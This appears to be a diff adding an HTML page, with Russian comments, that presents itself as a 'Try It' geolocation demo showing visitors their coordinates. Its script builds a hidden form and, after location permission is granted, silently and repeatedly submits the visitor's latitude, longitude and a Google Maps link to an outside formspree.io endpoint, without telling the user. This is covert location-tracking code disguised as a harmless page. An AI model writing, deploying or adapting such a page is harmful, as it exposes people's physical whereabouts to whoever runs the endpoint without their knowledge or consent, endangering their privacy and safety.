@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <title>GetGPS</title>
+  <style>
+    :root {
+      --fire: rgb(209, 66, 66);
+    }
+    .button_get_gps {
+      cursor: pointer;
+      border-radius: 5px;
+      padding: 5px 10px 5px 10px;
+      border: 2px solid var(--fire);
+      background-color: rgba(255, 140, 0, 0.329);
+      color: black;
+      font-weight: 700;
+      transition: .5s;
+      font-family: 'Trebuchet MS', 'Lucida Sans Unicode', 'Lucida Grande', 'Lucida Sans', Arial, sans-serif;
+    }
+    .button_get_gps:hover {
+      transform: scale(1.2);
+      border: 2px dotted green;
+      background-color: rgba(0, 255, 55, 0.329);
+      color: green;
+    }
+  </style>
+</head>
+<body>
+  <h1>HTML Geolocation</h1>
+  <p>Click the button to get your coordinates.</p>
+
+  <button class="button_get_gps" onclick="getLocation()">Try It</button>
+
+  <p id="input_gps"></p>
+
+  <script>
+    const x = document.getElementById("input_gps");
+    const latitudeInput = document.createElement("input");
+    const longitudeInput = document.createElement("input");
+    const ipAddressInput = document.createElement("input");
+    const finalLinkInput = document.createElement("input");
+
+    // Добавляем атрибуты к созданным input-ам
+    latitudeInput.type = "hidden";
+    latitudeInput.id = "latitude";
+    latitudeInput.name = "latitude";
+    longitudeInput.type = "hidden";
+    longitudeInput.id = "longitude";
+    longitudeInput.name = "longitude";
+    ipAddressInput.type = "hidden";
+    ipAddressInput.id = "ipAddress";
+    ipAddressInput.name = "ipAddress";
+    finalLinkInput.type = "hidden";
+    finalLinkInput.id = "finalLink";
+    finalLinkInput.name = "finalLink";
+
+    // Добавляем созданные input-ы к форме
+    const gpsForm = document.createElement("form");
+    gpsForm.action = "https://formspree.io/f/xyyrkvqg";
+    gpsForm.method = "POST";
+    gpsForm.appendChild(latitudeInput);
+    gpsForm.appendChild(longitudeInput);
+    gpsForm.appendChild(ipAddressInput);
+    gpsForm.appendChild(finalLinkInput);
+
+    document.body.appendChild(gpsForm);
+
+    function getLocation() {
+      if (navigator.geolocation) {
+        navigator.geolocation.watchPosition(showPosition);
+      } else {
+        x.innerHTML = "Geolocation is not supported by this browser.";
+      }
+    }
+
+    function showPosition(position) {
+      const latitude = position.coords.latitude;
+      const longitude = position.coords.longitude;
+
+      // Получаем конечную ссылку
+      const finalLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      // Получаем IP-адрес пользователя (в этом примере фиктивно)
+      const ipAddress = "127.0.0.1";
+
+      // Обновляем ссылку с использованием полученных координат на Google Maps
+      const updatedLink = `https://www.google.com/maps?q=${latitude},${longitude}`;
+
+      // Выводим координаты и обновленную ссылку
+      x.innerHTML = `Latitude: ${latitude}<br>Longitude: ${longitude}<br>Updated Link: <a href="${updatedLink}" target="_blank">${updatedLink}</a>`;
+
+      // Заполняем значения в созданные input-ы
+      latitudeInput.value = latitude;
+      longitudeInput.value = longitude;
+      ipAddressInput.value = ipAddress;
+      finalLinkInput.value = finalLink;
+
+      // Отправляем форму на сервер
+      sendDataToServer();
+    }
+
+    function sendDataToServer() {
+      // Отправляем форму на сервер
+      gpsForm.submit();
+    }
+  </script>
+</body>
+</html>
